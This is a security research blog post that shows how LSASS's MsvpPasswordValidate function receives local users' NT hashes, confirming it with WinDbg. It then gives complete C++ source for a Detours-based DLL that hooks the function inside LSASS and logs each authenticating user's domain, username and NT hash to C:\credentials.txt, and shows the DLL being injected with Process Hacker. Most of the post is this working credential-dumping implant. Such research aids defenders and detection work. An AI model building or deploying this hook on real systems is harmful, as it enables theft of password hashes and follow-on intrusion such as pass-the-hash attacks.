---
layout: post
title: Taking a detour inside LSASS
subtitle: Extracting local hashes by hooking functions inside LSASS
author:
- last
---
#### TL;DR
This is a repost of an analysis I posted on my Gitbook some time ago. Basically, when you authenticate as ANY local user on Windows, the NT hash of that user is checked against the NT hash of the supplied password by LSASS through the function `MsvpPasswordValidate`, exported by NtlmShared.dll. If you hook `MsvpPasswordValidate` you can extract this hash without touching the SAM. Of course, to hook this function in LSASS you need admin privilege. Technically it also works for domain users who have logged on the machine at least once, but the resulting hash is not a NT hash, but rather a MSCACHEv2 hash.

Last August [FuzzySec](https://twitter.com/FuzzySec) tweeted [something interesting](https://twitter.com/FuzzySec/status/1292495775512113152):

![fuzzysec tweet]({{site.baseurl}}/img/fuzzysectweet.PNG)

Since I had some spare time I decided to look into it and try and write my own local password dumping utility. But first, I had to confirm this information.

#### Confirming the information
To do so, I fired up a Windows 10 20H2 VM, set it up for kernel debugging and set a breakpoint into lsass.exe at the start of MsvpPasswordValidate (part of the NtlmShared.dll library) through WinDbg. But first you have to find LSASS' _EPROCESS address using the following command:

```
!process 0 0 lsass.exe
```

![process command]({{site.baseurl}}/img/processcommand.png)

Once the `_EPROCESS` address is found we have to switch WinDbg's context to the target process (your address will be different):

```
.process /i /p /r ffff8c05c70bc080
```

![process command 2]({{site.baseurl}}/img/processcommand2.png)

Remember to use the `g` command right after the last command to make the switch actually happen. Now that we are in LSASS' context we can load into the debugger the user mode symbols, since we are in kernel debugging, and then place a breakpoint at `NtlmShared!MsvpPasswordValidate`:

```
.reload /user
bp NtlmShared!MsvpPasswordValidate
```

We can make sure our breakpoint has been set by using the `bl` command:

![bl command]({{site.baseurl}}/img/blcommand.png)


Before we go on however we need to know what to look for. `MsvpPasswordValidate` is an undocumented function, meaning we won't find it's definition on MSDN. Looking here and there on the interwebz I managed to find it on multiple websites, so here it is:
```
BOOLEAN __stdcall MsvpPasswordValidate (
     BOOLEAN UasCompatibilityRequired,
     NETLOGON_LOGON_INFO_CLASS LogonLevel,
     PVOID LogonInformation,
     PUSER_INTERNAL1_INFORMATION Passwords,
     PULONG UserFlags,
     PUSER_SESSION_KEY UserSessionKey,
     PLM_SESSION_KEY LmSessionKey
);
```

What we are looking for is the fourth argument. The "Passwords" argument is of type `PUSER_INTERNAL1_INFORMATION`. This is a pointer to a `SAMPR_USER_INTERNAL1_INFORMATION` structure, whose first member is the NT hash we are looking for:

```
typedef struct _SAMPR_USER_INTERNAL1_INFORMATION {
   ENCRYPTED_NT_OWF_PASSWORD EncryptedNtOwfPassword;
   ENCRYPTED_LM_OWF_PASSWORD EncryptedLmOwfPassword;
   unsigned char NtPasswordPresent;
   unsigned char LmPasswordPresent;
   unsigned char PasswordExpired;
 } SAMPR_USER_INTERNAL1_INFORMATION, *PSAMPR_USER_INTERNAL1_INFORMATION;
  ```

As `MsvpPasswordValidate` uses the `stdcall` calling convention, we know the Passwords argument will be stored into the R9 register, hence we can get to the actual structure by dereferencing the content of this register. With this piece of information we type `g` once more in our debugger and attempt a login through the runas command:

![runas command]({{site.baseurl}}/img/runas.gif)

And right there our VM froze because we hit the breakpoint we previously set:

![breakpoint hit]({{site.baseurl}}/img/breakpoint.png)

Now that our CPU is where we want it to be we can check the content of R9:

```
db @r9
```

![db command]({{site.baseurl}}/img/dbr9.png)

That definetely looks like a hash! We know our test user uses "antani" as password and its NT hash is `1AC1DBF66CA25FD4B5708E873E211F06`, so the extracted value is the correct one. 

#### Writing the DLL
Now that we have verified FuzzySec's hint we can move on to write our own password dumping utility. We will write a custom DLL which will hook `MsvpPasswordValidate`, extract the hash and write it to disk. This DLL will be called HppDLL, since I will integrate it in a tool I already made (and which I will publish sooner or later) called HashPlusPlus (HPP for short). We will be using Microsoft Detours to perform the hooking action, __better not to use manual hooking when dealing with critical processes like LSASS, as crashing will inevitably lead to a reboot__. I won't go into details on how to compile Detours and set it up, it's pretty straightforward and I will include a compiled Detours library into HppDLL's repository.
The idea here is to have the DLL hijack the execution flow as soon as it reaches `MsvpPasswordValidate`, jump to a rogue routine which we will call `HookMSVPPValidate` and that will be responsible for extracting the credentials. Done that, `HookMSVPPValidate` will return to the legitimate `MsvpPasswordValidate` and continue the execution flow transparently for the calling process. Complex? Not so much actually. 

##### Hppdll.h
We start off by writing the header all of the code pieces will include:

```
#pragma once
#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN

// uncomment the following definition to enable debug logging to c:\debug.txt
#define DEBUG_BUILD

#include <windows.h>
#include <SubAuth.h>
#include <iostream>
#include <fstream>
#include <string>
#include "detours.h"

// if this is a debug build declare the PrintDebug() function
// and define the DEBUG macro in order to call it
// else make the DEBUG macro do nothing
#ifdef DEBUG_BUILD
void PrintDebug(std::string input);
#define DEBUG(x) PrintDebug(x)
#else
#define DEBUG(x) do {} while (0)
#endif

// namespace containing RAII types to make sure handles are always closed before detaching our DLL
namespace RAII
{
	class Library
	{
	public:
		Library(std::wstring input);
		~Library();
		HMODULE GetHandle();

	private:
		HMODULE _libraryHandle;
	};

	class Handle
	{
	public:
		Handle(HANDLE input);
		~Handle();
		HANDLE GetHandle();

	private:
		HANDLE _handle;
	};
}

//functions used to install and remove the hook
bool InstallHook();
bool RemoveHook();

// define the pMsvpPasswordValidate type to point to MsvpPasswordValidate
typedef BOOLEAN(WINAPI* pMsvpPasswordValidate)(BOOLEAN, NETLOGON_LOGON_INFO_CLASS, PVOID, void*, PULONG, PUSER_SESSION_KEY, PVOID);
extern pMsvpPasswordValidate MsvpPasswordValidate;

// define our hook function with the same parameters as the hooked function
// this allows us to directly access the hooked function parameters
BOOLEAN HookMSVPPValidate
(
	BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	void* Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey
);
```

This header includes various Windows headers that define the various native types used by `MsvpPasswordValidate`. You can see I had to slightly modify the `MsvpPasswordValidate` function definition since I could not find the headers defining `PUSER_INTERNAL1_INFORMATION`, hence we treat it like a normal void pointer. I also define two routines, `InstallHook` and `RemoveHook`, that will deal with injecting our hook and cleaning it up afterwards. I also declare a `RAII` namespace which will hold `RAII` classes to make sure handles to libraries and other stuff will be properly closed as soon as they go out of scope (yay C++).
I also define a `pMsvpPasswordValidate` type which we will use in conjunction with `GetProcAddress` to properly resolve and then call `MsvpPasswordValidate`. Since the `MsvpPasswordValidate` pointer needs to be global we also extern it. 

##### DllMain.cpp
The DllMain.cpp file holds the definition and declaration of the `DllMain` function, responsible for all the actions that will be taken when the DLL is loaded or unloaded:

```
#include "pch.h"
#include "hppdll.h"

pMsvpPasswordValidate MsvpPasswordValidate = nullptr;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        return InstallHook();
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        return RemoveHook();
    }
    return TRUE;
}
```

Top to bottom, we include `pch.h` to enable precompiled headers and speed up compilation, and `hppdll.h` to include all the types and functions we defined earlier. We also set to `nullptr` the `MsvpPasswordValidate` function pointer, which will be filled later by the `InstallHook` function with the address of the actual `MsvpPasswordValidate`. You can see that `InstallHook` gets called when the DLL is loaded and `RemoveHook` is called when the DLL is unloaded.

##### InstallHook.cpp
InstallHook is the function responsible for actually injecting our hook:

```
#include "pch.h"
#include "hppdll.h"

bool InstallHook()
{
	DEBUG("InstallHook called!");

	// get a handle on NtlmShared.dll
	RAII::Library ntlmShared(L"NtlmShared.dll");
	if (ntlmShared.GetHandle() == nullptr)
	{
		DEBUG("Couldn't get a handle to NtlmShared");
		return false;
	}

	// get MsvpPasswordValidate address
	MsvpPasswordValidate = (pMsvpPasswordValidate)::GetProcAddress(ntlmShared.GetHandle(), "MsvpPasswordValidate");
	if (MsvpPasswordValidate == nullptr)
	{
		DEBUG("Couldn't resolve the address of MsvpPasswordValidate");
		return false;
	}

	DetourTransactionBegin();
	DetourUpdateThread(::GetCurrentThread());
	DetourAttach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	LONG error = DetourTransactionCommit();
	if (error != NO_ERROR)
	{
		DEBUG("Failed to hook MsvpPasswordValidate");
		return false;
	}
	else
	{
		DEBUG("Hook installed successfully");
		return true;
	}
}
```

It first gets a handle to the NtlmShared DLL at line 9. 
At line 17 the address to the beginning of `MsvpPasswordValidate` is resolved by using `GetProcAddress`, passing to it the handle to NtlmShared and a string containing the name of the function. 
At lines from 24 to 27 Detours does its magic and replaces `MsvpPasswordValidate` with our rogue `HookMSVPPValidate` function. If the hook is installed correctly, `InstallHook` returns true.
You may have noticed I use the `DEBUG` macro to print debug information. This macro makes use of conditional compilation to write to `C:\debug.txt` if the `DEBUG_BUILD` macro is defined in `hppdll.h`, otherwise it does nothing.

##### HookMSVPPValidate.cpp
Here comes the most important piece of the DLL, the routine responsible for extracting the credentials from memory.

```
#include "pch.h"
#include "hppdll.h"

BOOLEAN HookMSVPPValidate(BOOLEAN UasCompatibilityRequired, NETLOGON_LOGON_INFO_CLASS LogonLevel, PVOID LogonInformation, void* Passwords, PULONG UserFlags, PUSER_SESSION_KEY UserSessionKey, PVOID LmSessionKey)
{
	DEBUG("Hook called!");
	// cast LogonInformation to NETLOGON_LOGON_IDENTITY_INFO pointer
	NETLOGON_LOGON_IDENTITY_INFO* logonIdentity = (NETLOGON_LOGON_IDENTITY_INFO*)LogonInformation;

	// write to C:\credentials.txt the domain, username and NT hash of the target user
	std::wofstream credentialFile;
	credentialFile.open("C:\\credentials.txt", std::fstream::in | std::fstream::out | std::fstream::app);
	credentialFile << L"Domain: " << logonIdentity->LogonDomainName.Buffer << std::endl;
	std::wstring username;
	
	// LogonIdentity->Username.Buffer contains more stuff than the username
	// so we only get the username by iterating on it only Length/2 times 
	// (Length is expressed in bytes, unicode strings take two bytes per character)
	for (int i = 0; i < logonIdentity->UserName.Length/2; i++)
	{
		username += logonIdentity->UserName.Buffer[i];
	}
	credentialFile << L"Username: " << username << std::endl;
	credentialFile << L"NTHash: ";
	for (int i = 0; i < 16; i++)
	{
		unsigned char hashByte = ((unsigned char*)Passwords)[i];
		credentialFile << std::hex << hashByte;
	}
	credentialFile << std::endl;
	credentialFile.close();

	DEBUG("Hook successfully called!");
	return MsvpPasswordValidate(UasCompatibilityRequired, LogonLevel, LogonInformation, Passwords, UserFlags, UserSessionKey, LmSessionKey);
}
```

We want our output file to contain information on the user (like the username and the machine name) and his NT hash. To do so we first cast the third argument, `LogonIdentity`, to be a pointer to a `NETLOGON_LOGON_IDENTITY_INFO` structure. From that we extract the `logonIdentity->LogonDomainName.Buffer` field, which holds the local domain (hece the machine hostname since it's a local account). This happens at line 8. At line 13 we write the extracted local domain name to the output file, which is `C:\credentials.txt`. As a side note, `LogonDomainName` is a `UNICODE_STRING` structure, defined like so:

```
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
```

From line 19 to 22 we iterate over `logonIdentity->Username.Buffer` for `logonIdentity->Username.Length/2` times. We have to do this, and not copy-paste directly the content of the buffer like we did with the domain, because this buffer contains the username AND other garbage. The `Length` field tells us where the username finishes and the garbage starts. Since the buffer contains unicode data, every character it holds actually occupies 2 bytes, so we need to iterate half the times over it.
From line 25 to 29 we proceed to copy the first 16 bytes held by the `Passwords` structure (which contain the actual NT hash as we saw previously) and write them to the output file.
To finish we proceed to call the actual `MsvpPasswordValidate` and return its return value at line 34 so that the authentication process can continue unimpeded.

##### RemoveHook.cpp
The last function we will take a look at is the RemoveHook function.

```
#include "pch.h"
#include "hppdll.h"

bool RemoveHook()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	auto error = DetourTransactionCommit();
	if (error != NO_ERROR)
	{
		DEBUG("Failed to unhook MsvpPasswordValidate");
		return false;
	}
	else
	{
		DEBUG("Hook removed!");
		return true;
	}
}
```

This function too relies on Detours magic. As you can see lines 6 to 9 are very similar to the ones called by `InstallHook` to inject our hook, the only difference is that we make use of the `DetourDetach` function instead of the `DetourAttach` one.

#### Test drive!
Alright, now that everything is ready we can proceed to compile the DLL and inject it into LSASS. For rapid prototyping I used Process Hacker for the injection.

![hppdll gif]({{site.baseurl}}/img/hppdll.gif)

It works! This time I tried to authenticate as the user "last", whose password is, awkwardly, "last".  You can see that even though the wrong password was input for the user, the true password hash has been written to `C:\credentials`.
That's all folks, it was a nice ride. You can find [the complete code for HppDLL on my GitHub](https://github.com/last-byte/HppDLL).  

last out!
